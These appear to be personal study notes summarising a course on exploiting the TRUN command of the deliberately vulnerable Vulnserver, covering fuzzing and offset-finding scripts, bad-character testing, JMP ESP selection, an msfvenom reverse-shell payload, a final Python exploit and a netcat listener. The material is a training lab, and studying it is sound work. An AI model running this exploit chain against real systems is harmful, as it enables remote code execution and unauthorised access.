---
Status: In progress
---
# Required Installations

1. You need Windows (You can use a Virtual Machine)
    1. [https://www.youtube.com/watch?v=-4c3MO3Hm_c](https://www.youtube.com/watch?v=-4c3MO3Hm_c)
2. Vulnserver
    1. A vulnerable server that we are going to be attacking
    2. [https://thegreycorner.com/2010/12/15/introducing-vulnserver.html](https://thegreycorner.com/2010/12/15/introducing-vulnserver.html)
        
        ![[/vulnserver-master.zip|vulnserver-master.zip]]
        
    3. Extract the Files to your Windows Desktop (or other folder)
        1. You may need to disable windows defender
3. Immunity Debugger
    1. [https://debugger.immunityinc.com/](https://debugger.immunityinc.com/)
    2. Install it
    3. It will prompt to install Python, say yes

# Buffer Overflow Explained

---

### Anatomy of Memory and Buffer Overflow (Transcript Notes)

1. **Memory Structure Basics**:
    - Memory is structured with:
        - **Kernel (Top)**: Command-line level and control mechanisms.
        - **Text (Bottom)**: Read-only code, often seen as a "bunch of zeros."
2. **Focus on the Stack**:
    - Key registers to know:
        - **ESP** (Stack Pointer): Marks the top of the stack.
        - **EBP** (Base Pointer): Marks the bottom of the stack's buffer space.
        - **EIP** (Instruction Pointer): Holds the return address, pointing to the next instruction.
    - **Buffer Overflow**:
        - The buffer fills downward; if overflowed, it can overwrite the EBP and reach the EIP, potentially redirecting program flow.
3. **Exploiting Buffer Overflow**:
    - Overflowing buffer space can allow control over the EIP.
    - Malicious code (shellcode) can be inserted to gain a reverse shell or root access.
4. **Steps to Conduct a Buffer Overflow**:
    - **Spiking**: Identify vulnerable parts of a program.
    - **Fuzzing**: Send varying data to the program to trigger failures.
    - **Finding the Offset**: Determine the specific point where overflow impacts EIP.
    - **Identifying Bad Characters**: Ensure shellcode executes without corrupt characters.
    - **Selecting the Correct Module**: Find a module without memory protection to place shellcode.
    - **Generating Shellcode**: Create malicious code that the EIP can point to.

---

# Spiking

Here’s a summary of the steps covered for "Spiking" in buffer overflow testing, along with key information on setting up tools and processes.

---

### Spiking for Buffer Overflow Vulnerabilities (Transcript Notes)

1. **Initial Setup**:
    - **Disable Windows Defender**: Turn off real-time protection to avoid blocking the vulnerability server (e.g., VulnServer).
    - **Run as Administrator**: Run both _VulnServer_ and _Immunity Debugger_ as administrator to ensure proper permissions for debugging and shell access.
2. **Running VulnServer**:
    - Start _VulnServer_ on the Windows machine (right-click and "Run as Administrator").
    - In _Immunity Debugger_, go to _File > Attach_ and select the _VulnServer_ process. Start it (press the play button) to see it running in the debugger.
3. **Connecting to VulnServer**:
    - From **Kali Linux**, use `netcat` to connect to _VulnServer_:
        
        ```Shell
        nc -nv <Windows IP> 9999
        ```
        
    - On connection, enter `HELP` to view a list of valid commands (e.g., `STATS`, `TRUN`, etc.). _TRUN_ is a known vulnerable command.
        
        ![[/image 54.png|image 54.png]]
        
4. **Spiking with Generic_send_tcp Tool**:
    - **Objective of Spiking**: Test commands by sending various inputs to determine which can overflow the buffer.
    - Use `generic_send_tcp` with a **spike script** to send data payloads:
        
        ```Shell
        generic_send_tcp <Windows IP> 9999 <spike_script> 0 0
        ```
        
    - Example spike scripts for testing commands (`STATS.spk`, `TRUN.spk`):
        
        ```Plain
        s_readline();
        s_string("STATS");
        s_string_variable();
        ```
        
5. **Testing Commands for Vulnerabilities**:
    - Run the `STATS.spk` spike script:
        - No crash indicates `STATS` is likely not vulnerable.
    - Run the `TRUN.spk` spike script:
        - A crash in _Immunity Debugger_ with "Access Violation" confirms a vulnerability.
        - _Immunity_ shows `41414141` (hex for "AAAA"), indicating buffer overflow.
6. **Key Observations**:
    - **EIP Overwrite**: The _EIP_ (Instruction Pointer) contains overwritten data (`41414141`), indicating control can be directed to malicious code.
    - **Next Steps**: The upcoming lesson will use a Python script to automate "fuzzing" (sending increasing input to `TRUN` to refine buffer overflow control).

---

# Fuzzing (With Python)

Here’s a breakdown of the video on **fuzzing** for buffer overflow vulnerabilities, including a sample Python script and setup instructions.

---

### Fuzzing for Buffer Overflow (Transcript Notes)

1. **Purpose of Fuzzing**:
    - Unlike spiking, which tests multiple commands, **fuzzing** targets a known vulnerable command (in this case, `TRUN`) by sending incremental inputs to identify the exact byte length at which the application crashes.
2. **Environment Setup**:
    - **Run Immunity Debugger and VulnServer as Administrator**: Close and restart Immunity and reattach to VulnServer after each crash.
    - **Immunity Debugger**: Attach _VulnServer_ and verify that it’s running in the lower-right corner of the Immunity window.
3. **Python Fuzzing Script**:
    - The following Python script incrementsally sends a buffer of “A” characters to the `TRUN` command, increasing in 100-byte intervals until the application crashes.
    - **Fuzzing Script**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        from time import sleep
        
        buffer = "A" * 100
        
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
                s.send(("TRUN /.:/" + buffer).encode('utf-8'))
                s.close()
                sleep(1)
                buffer += "A" * 100
            except:
                print(f"Fuzzing crashed at {len(buffer)} bytes")
                sys.exit()
        ```
        
    - **Explanation**:
        - **Modules**: `socket` for connecting to VulnServer, `sleep` to add a delay between attempts.
        - **Buffer**: Starts with 100 “A” characters and appends 100 more in each iteration.
        - **Connection**: Sends the `TRUN` command with the buffer to VulnServer.
        - **Loop**: Continues until the application crashes, then prints the byte count.
4. **Running the Script**:
    
    ![[/image 1 7.png|image 1 7.png]]
    
    - Make the script executable:
        
        ```Shell
        chmod +x fuzzing.py
        ```
        
    - Run the script:
        
        ```Shell
        ./fuzzing.py
        ```
        
    - Monitor **Immunity Debugger** for a crash, which will display an access violation.
5. **Result Analysis**:
    - The crash should happen around a certain byte size (e.g., ~2700 bytes), which will help identify the approximate buffer size limit.
    - Check Immunity Debugger to confirm overflowed values in the _EIP_ register (Instruction Pointer). This confirms control of the buffer input.
6. **Next Steps**:
    - In the following video, a tool will help pinpoint the exact byte offset where the EIP register is overwritten, allowing precise control for exploit development.
    - Controlling EIP is critical for redirecting program execution to custom shellcode.

---

These notes outline the essentials for fuzzing in buffer overflow testing. Let me know if you’d like these saved as a .txt file.

# Finding the Offset

---

### Finding the Offset in Buffer Overflow (Transcript Notes)

1. **Purpose of Finding the Offset**:
    - In a buffer overflow, finding the precise byte offset where the EIP (Instruction Pointer) is overwritten is crucial for gaining control over execution flow.
2. **Using Metasploit's** `**pattern_create**` **Tool**:
    - Metasploit provides a tool called `pattern_create` to generate a unique string that helps identify the offset.
    - **Generate the Pattern**:
        
        ```Shell
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
        ```
        
        - The `l 3000` specifies a length of 3000 bytes (based on previous observations that the program crashes around this size).
    - Copy the generated pattern for use in the next step.
3. **Modifying the Fuzzing Script to Send the Pattern**:
    - Update the previous fuzzing script to send the 3000-byte pattern instead of repeated “A” characters.
    - **Script (**`**offset_finder.py**`**)**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        
        buffer = "Aa0Aa1Aa2Aa3Aa4..."  # Paste generated pattern here
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
            s.send(("TRUN /.:/" + buffer).encode('utf-8'))
            s.close()
        except:
            print("Error connecting to server")
            sys.exit()
        ```
        
    - **Explanation**:
        - This script sends the specific 3000-byte pattern generated by `pattern_create`.
        - After the crash, check Immunity Debugger to view the overwritten EIP value.
4. **Locating the Offset with** `**pattern_offset**`:
    - After running the modified script, observe the EIP register in **Immunity Debugger** for a unique pattern (e.g., `386F4337`).
    - Use `**pattern_offset**` to find where this value appears in the 3000-byte sequence:
        
        ```Shell
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
        ```
        
    - The output shows the exact offset where EIP is overwritten (e.g., 2003 bytes).
5. **Next Steps**:
    - With the offset identified, the next video will involve creating specific input to overwrite the EIP at this position and verify control over the pointer.
    - Once control is established, the exploit can direct execution to malicious code.

---

These notes cover the essential steps to find the EIP offset in a buffer overflow. Let me know if you need a .txt file with this summary!

# Overwriting the EIP

Here is a summary of the video on **overwriting the EIP (Instruction Pointer)**, detailing the process of modifying the script to control EIP and confirming successful overwrite.

---

### Overwriting the EIP in Buffer Overflow (Transcript Notes)

1. **Objective**:
    - Using the previously identified offset (2003 bytes), the goal is to overwrite the EIP with a specific set of characters, confirming control over the EIP.
2. **Setting Up the Environment**:
    - Start **Immunity Debugger** with _VulnServer_ attached and running.
3. **Modifying the Exploit Script**:
    - Edit the previous Python script to send a payload that overwrites the EIP.
    - **Script (**`**overwrite_eip.py**`**)**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        
        # Adjusted payload with offset and EIP overwrite
        shellcode = "A" * 2003 + "B" * 4
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
            s.send(("TRUN /.:/" + shellcode).encode('utf-8'))
            s.close()
        except:
            print("Error connecting to server")
            sys.exit()
        ```
        
    - **Explanation**:
        - `**"A" * 2003**`: Fills the buffer up to the EIP.
        - `**"B" * 4**`: Overwrites the EIP with four "B" characters (hex `42424242`) to observe if they appear in the EIP.
4. **Running the Script**:
    - Save the script and run it while monitoring **Immunity Debugger**.
    - After running the script, check if the EIP register contains `42424242` (indicating successful overwrite).
5. **Verifying the Result**:
    - Immunity Debugger should show:
        - **EIP**: `42424242` (4 "B"s).
        - This confirms that the offset calculation was correct and EIP is under control.
6. **Next Steps**:
    - With control over the EIP established, the next steps involve:
        - **Finding Bad Characters**: Ensuring that the payload can execute without interference.
        - **Selecting a Safe Module**: Choosing a non-protected memory space for executing malicious shellcode.

---

These notes outline the key steps in confirming control over the EIP. Let me know if you’d like this saved as a .txt file.

# Finding the Bad Characters

Here's a summary of the video on **finding bad characters** in buffer overflow exploitation, which ensures that the generated shellcode won’t break due to problematic characters.

---

### Finding Bad Characters in Buffer Overflow (Transcript Notes)

1. **Purpose of Identifying Bad Characters**:
    - When generating shellcode, certain characters can cause the program to malfunction. Commonly, **null byte (**`**\\x00**`**)** is a known bad character, but other characters may also interfere with the payload.
    - **Goal**: Identify and exclude all problematic characters before generating shellcode.
2. **Accessing a List of Bad Characters**:
    - Use a pre-made list of hex values from `\\x01` to `\\xFF` (excluding `\\x00`) to check for compatibility.
    - Copy the list from an external source (e.g., `bulbsecurity.com`) or generate it manually.
3. **Modifying the Exploit Script to Test Bad Characters**:
    - Edit the previous script to include the bad character list after the EIP overwrite.
    - **Script (**`**test_bad_chars.py**`**)**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        
        # Replace the EIP overwrite with "B" characters and follow it with bad characters list
        bad_chars = (
            "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"
            "\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"
            # Continue with all hex values up to \\xff, excluding \\x00
        )
        payload = "A" * 2003 + "B" * 4 + bad_chars
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
            s.send(("TRUN /.:/" + payload).encode('latin-1'))
            s.close()
        except:
            print("Error connecting to server")
            sys.exit()
        ```
        
    - **Explanation**:
        - `**"A" * 2003**`: Fills buffer up to the EIP.
        - `**"B" * 4**`: Overwrites EIP for visibility in Immunity Debugger.
        - `**bad_chars**`: Sends a sequence of all characters from `\\x01` to `\\xFF`, testing each one’s effect on the program.
4. **Running the Script and Analyzing the Hex Dump**:
    - After running the script, monitor **Immunity Debugger**.
    - Check the **ESP** register and select "Follow in Dump" to view the hexadecimal data.
    - **Examine the Hex Dump**:
        - Verify that each character from `\\x01` to `\\xFF` appears in sequence.
        - If a character is missing or incorrectly displayed, it indicates a **bad character**.
5. **Example of Bad Character Identification**:
    - If characters like `\\x04` or `\\x05` are missing in sequence (e.g., jumps from `\\x03` to `\\x06`), mark these as bad characters to exclude from shellcode generation.
    - Note down all problematic characters for later exclusion.
6. **Final Steps**:
    - For _VulnServer_, typically only `\\x00` is problematic. Future steps include:
        - **Finding the Right Module**: Ensuring the payload executes in unprotected memory.
        - **Generating Shellcode**: Creating the final payload with the bad characters excluded to gain root access.

---

These notes cover the essentials for testing bad characters in buffer overflow exploitation. Let me know if you'd like these notes saved as a .txt file.

# Finding the Right Module

Here is a summary of the video on **finding the right module and setting a breakpoint** to control the EIP, which prepares for successful shellcode execution.

---

### Finding the Right Module and Setting a Breakpoint (Transcript Notes)

1. **Purpose of Finding the Right Module**:
    - To ensure successful exploitation, locate a module (DLL) in the target application that:
        - Has **no memory protections** (e.g., no DEP, no ASLR).
        - Contains a **reliable return address** for redirecting code execution.
2. **Using** `**mona modules**` **to Locate a Suitable Module**:
    - **Download** the `mona.py` script and place it in the **Immunity Debugger** plugin directory:
        
        ```Plain
        C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands
        ```
        
    - Run `mona modules` in **Immunity Debugger**:
        
        ```Plain
        !mona modules
        ```
        
    - **Output**: Look for modules related to _VulnServer_ with all protections set to "false."
    - Example: `**essfunc.dll**` (a good candidate if it has no protections enabled).
3. **Identifying the Opcode for Jump ESP**:
    - Use **Nasm Shell** in Kali Linux to find the opcode for a jump (`JMP ESP`), which directs execution to the malicious code:
        
        ```Shell
        locate nasm_shell.rb
        ./nasm_shell.rb
        ```
        
    - Type `JMP ESP` to obtain the opcode:
        
        ```Plain
        JMP ESP  =>  \\xFF\\xE4
        ```
        
4. **Finding the Address of JMP ESP in the Selected Module**:
    - In Immunity Debugger, use the `mona find` command to search for the `JMP ESP` opcode within `essfunc.dll`:
        
        ```Plain
        !mona find -s "\\xFF\\xE4" -m essfunc.dll
        ```
        
    - **Output**: A list of potential return addresses. Choose one to use as the EIP overwrite address.
5. **Modifying the Exploit Script with the Return Address**:
    - Update the EIP overwrite in the script to use the selected return address (in reverse order due to little-endian format).
    - **Example**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        
        ret_address = "\\xAF\\x11\\x50\\x62"  # Example address in reverse
        payload = "A" * 2003 + ret_address
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
            s.send(("TRUN /.:/" + payload).encode('latin-1'))
            s.close()
        except:
            print("Error connecting to server")
            sys.exit()
        ```
        
6. **Setting a Breakpoint on the Return Address**:
    - In **Immunity Debugger**, follow the selected return address by:
        - Right-clicking the address, selecting **Follow in Disassembler**, and pressing **F2** to set a breakpoint.
    - **Goal**: The program will pause execution at the breakpoint, confirming control over EIP.
7. **Executing the Script and Verifying Control**:
    - Run the modified script from Kali Linux.
    - **Expected Result**: Immunity Debugger pauses at the breakpoint, indicating successful EIP control.
8. **Next Steps**:
    - With control over EIP, the next step is to generate shellcode, replacing the current payload to redirect execution to the malicious code.

---

These notes summarize the process for finding a suitable module, setting a breakpoint, and verifying EIP control. Let me know if you'd like these saved as a .txt file.

# Generating Shellcode and Getting Root

Here’s a summary of the final video in the course, detailing how to gain a reverse shell by generating shellcode and completing the buffer overflow exploit.

---

### Gaining a Reverse Shell with Buffer Overflow (Transcript Notes)

1. **Objective**:
    - Generate shellcode to gain a reverse shell on the target system by exploiting the vulnerable `TRUN` command.
2. **Generating Shellcode with** `**msfvenom**`:
    - Use `msfvenom` to create a reverse shell payload that the vulnerable program will execute.
    - **Shellcode Generation Command**:
        
        ```Shell
        msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\\x00"
        ```
        
    - **Explanation**:
        - `p windows/shell_reverse_tcp`: Payload for a Windows reverse TCP shell.
        - `LHOST`: Kali machine IP address (attacker’s IP).
        - `LPORT`: Listening port (e.g., `4444`).
        - `EXITFUNC=thread`: Improves stability by exiting via the thread.
        - `f c`: Output shellcode in C format.
        - `a x86`: Target architecture.
        - `b "\\x00"`: Exclude bad characters (e.g., `\\x00`).
3. **Integrating Shellcode into the Exploit Script**:
    - Copy the generated shellcode and add it to the Python script as a variable.
    - **Modified Exploit Script (**`**final_exploit.py**`**)**:
        
        ```Python
        #!/usr/bin/env python3
        import sys, socket
        
        # Shellcode generated by msfvenom
        overflow = (
            "\\xda\\xc9\\xd9\\x74\\x24\\xf4\\x5b\\xbf\\x5f\\x83\\x5a\\xf8\\x31\\xc9\\xb1"
            # Continue with the rest of the shellcode
        )
        
        # Final payload
        payload = "A" * 2003 + "\\xaf\\x11\\x50\\x62" + "\\x90" * 32 + overflow
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.90", 9999))  # Replace with VulnServer's IP
            s.send(("TRUN /.:/" + payload).encode('latin-1'))
            s.close()
        except:
            print("Error connecting to server")
            sys.exit()
        ```
        
    - **Explanation**:
        - `"A" * 2003`: Fills buffer up to the EIP.
        - `"\\xaf\\x11\\x50\\x62"`: JMP ESP address in `essfunc.dll` (reversed due to little-endian format).
        - `"\\x90" * 32`: NOP sled, providing padding to ensure shellcode stability.
        - `overflow`: Shellcode generated by `msfvenom`.
4. **Setting Up the Listener**:
    - Start a Netcat listener on Kali to catch the reverse shell:
        
        ```Shell
        nc -lvnp 4444
        ```
        
5. **Executing the Exploit**:
    - Run _VulnServer_ as an administrator (Immunity Debugger is not needed this time).
    - Execute the Python exploit script.
    - **Expected Result**: The Netcat listener should receive a connection, providing a shell on the target machine.
6. **Verification**:
    - Once the shell is open, execute commands to verify access:
        
        ```Shell
        whoami  # Verify user privileges
        ```
        
    - In this example, the shell confirms administrative access.
7. **Summary of Steps Covered**:
    - The course has demonstrated each step from vulnerability identification and offset discovery to module selection, shellcode generation, and exploitation to gain a root shell.

---

These notes capture the final steps in achieving a reverse shell with buffer overflow. Let me know if you’d like these saved as a .txt file.